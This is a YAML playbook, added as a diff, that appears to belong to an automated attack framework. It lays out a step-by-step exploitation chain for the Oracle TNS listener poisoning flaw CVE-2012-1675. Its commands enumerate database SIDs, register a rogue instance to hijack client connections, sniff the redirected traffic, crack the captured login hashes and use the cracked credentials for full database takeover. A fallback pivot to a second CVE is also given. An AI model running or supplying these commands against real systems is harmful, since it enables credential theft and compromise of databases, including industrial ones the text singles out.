@@ -1,0 +1,65 @@
+chain_id: oracle_tns_poisoning_cve_2012_1675
+title: "Oracle TNS Listener — CVE-2012-1675 unauth load-balancing registration → MITM"
+severity: HIGH
+tags: [oracle, tns, cve-2012-1675, mitm, sql, post-exploit]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2012-1675" }
+    - { service_pattern: "(?i)oracle-tns|tnslsnr" }
+    - { banner_pattern: "(?i)oracle.*tns|tns\\s*listener" }
+    - { port_in: [1521, 1522, 1523, 1525, 1526] }
+
+description: |
+  Pre-12c Oracle TNS Listeners accept anonymous registration of new
+  database service instances ("load-balancing" feature). An attacker
+  registers a service with the same SID as a real DB; new clients
+  connecting are routed through the attacker, who proxies to the
+  real DB and captures every query + credential (often clear-text on
+  the SQLNET wire). Oracle declined to issue a fix — only mitigation
+  is the COST/VNCR ACL, rarely deployed. Industrial SCADA boxes
+  running Oracle 11g almost universally vulnerable.
+
+steps:
+  - id: 1
+    title: "Confirm TNS Listener and pull SIDs"
+    command: |
+      nmap -p 1521 --script=oracle-sid-brute,oracle-tns-version $VICTIMA
+      git clone https://github.com/quentinhardy/odat /opt/odat
+      cd /opt/odat && python3 odat.py sidguesser -s $VICTIMA -p 1521
+
+  - id: 2
+    title: "Register a malicious DB instance with the same SID"
+    command: |
+      # tnscmd / oscanner / TNS poisoning PoC:
+      git clone https://github.com/quentinhardy/odat-tools
+      python3 tns-poison.py -t $VICTIMA -p 1521 -s ORCL --register
+
+  - id: 3
+    title: "Catch redirected traffic with TNScmd / Wireshark"
+    command: |
+      # Once registered, half the connections route through us.
+      tnscmd10g status -h $VICTIMA -p 1521
+      tcpdump -i any -A -s0 'port 1521' | tee tns.log
+
+  - id: 4
+    title: "Crack captured SQLNET native-auth O5LOGIN hashes"
+    command: |
+      # Hashes look like:  hash=...,salt=...,user=SCOTT
+      hashcat -m 12300 oracle.hash /usr/share/wordlists/rockyou.txt
+
+  - id: 5
+    title: "With creds — full DB takeover"
+    command: |
+      python3 odat.py all -s $VICTIMA -d ORCL -U SCOTT -P 'cracked'
+      # All-in-one: file read, passwordstealer, smb relay.
+
+common_errors:
+  - error: "Listener rejects registration: 'TNS-12546'"
+    solution: |
+      VNCR or COST ACL set (rare but real). Pivot to CVE-2012-3137
+      O5LOGIN downgrade — same wire-protocol abuse, different gadget.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2012-1675
+  - https://www.joxeankoret.com/download/tnspoison.pdf
